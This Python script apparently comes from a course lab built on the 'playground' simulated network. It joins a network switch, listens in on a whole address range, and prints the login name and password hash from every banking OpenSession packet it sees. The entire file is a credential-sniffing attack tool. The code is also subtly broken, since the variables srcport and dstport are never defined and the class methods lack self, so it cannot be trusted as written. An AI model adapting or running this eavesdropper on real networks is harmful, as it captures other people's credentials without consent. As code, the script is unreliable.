import os
import sys
import logging
import playground
import asyncio
from playground.network.packet import PacketType
from BankMessages import *
import logging

#logging.getLogger().setLevel(logging.NOTSET)
#logging.getLogger().addHandler(logging.StreamHandler())

class demuxer:
    def connectionMade():
        pass

    def demux(src, srcPort, dst, dstPort, demuxData):
        deserializer = PacketType.Deserializer()
        deserializer.update(demuxData)
        #print("data:",demuxData)
        #if src not in ['20174.1.1337.6','20174.1.1337.4']:
        #     return
        print("src",src)

        for packet in deserializer.nextPackets():
            if isinstance(packet,OpenSession):
                print("packet from ", src, ":", srcport)
                print("packet destination", dst, ":", dstport)
                print("Data", demuxData)
                print("user", packet.Login)
                print("passwd", packet.PasswordHash)
                print("--------------------------------------")


if __name__=="__main__":
    loop = asyncio.get_event_loop()
    eavesdrop = playground.network.protocols.switching.PlaygroundSwitchTxProtocol(demuxer, "20174.1.*.*")
    coro = loop.create_connection(lambda:eavesdrop, "192.168.200.240", 9090)
    loop.run_until_complete( coro )
    loop.run_forever()
   # loop.close()


